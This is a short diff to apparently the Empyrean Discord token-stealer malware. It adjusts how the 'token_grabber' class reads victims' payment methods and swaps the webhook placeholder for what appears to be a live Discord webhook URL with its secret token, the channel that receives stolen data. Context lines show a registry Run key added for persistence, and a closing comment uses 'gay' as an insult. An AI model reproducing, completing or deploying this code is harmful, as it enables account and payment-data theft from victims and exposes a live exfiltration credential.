@@ -123,9 +123,9 @@ class token_grabber():
             else:
                 methods = ""
                 for method in b.json():
-                    if method['type'] == 1:
+                    if method['type'] == '1':
                         methods += "💳"
-                    elif method['type'] == 0:
+                    elif method['type'] == '0':
                         methods += "<:paypal:973417655627288666>"
                     else:
                         methods += "❓"
@@ -604,7 +604,7 @@ class startup():
         subprocess.call(["reg", "add", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Empyrean", "/t", "REG_SZ", "/d", self.Empyrean_dir + "\\" + os.path.basename(__file__)], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
   
 if __name__ == "__main__":
-    main("WEBHOOK_URL")
+    main("https://discord.com/api/webhooks/978783676756287598/YDlOl27IIVVB5ikuL8MRI6B0LO7OAPXrpn-TKsPfhLCMEtQPqyK4r5AkaxRMaD9tToGB")
     
 # 600 lines of gay code made by https://github.com/addi00000
 # dont skid :)
